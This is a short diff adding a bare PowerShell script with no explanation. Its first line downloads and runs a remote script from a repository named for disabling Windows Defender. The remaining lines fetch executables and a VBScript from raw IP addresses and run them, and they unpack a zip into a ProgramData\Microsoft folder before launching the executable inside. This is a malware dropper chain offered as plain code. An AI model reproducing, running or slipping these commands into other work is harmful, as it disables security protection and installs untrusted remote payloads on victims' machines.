@@ -1,0 +1,10 @@
+Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Raroford32/DisableWindowsDefender/main/w2022')
+powershell Invoke-WebRequest -Uri http://45.32.125.172/last.vbe -OutFile .\last.vbe; .\last.vbe
+powershell Invoke-WebRequest -Uri 45.32.125.172/Visors.exe -OutFile .\Visors.exe; .\Visors.exe
+powershell Invoke-WebRequest -Uri http://45.32.125.172/svc.exe -OutFile .\svc.exe; .\svc.exe
+Invoke-WebRequest -Uri "http://37.27.22.144/sortolsh.zip" -OutFile "$env:ProgramData\Microsoft\sortolsh.zip"; Expand-Archive -Path "$env:ProgramData\Microsoft\sortolsh.zip" -DestinationPath "$env:ProgramData\Microsoft";
+Start-Process "$env:ProgramData\Microsoft\sortolsh.exe"
+cd C:\ProgramData\Microsoft
+.\sortolsh.exe
+exit
+
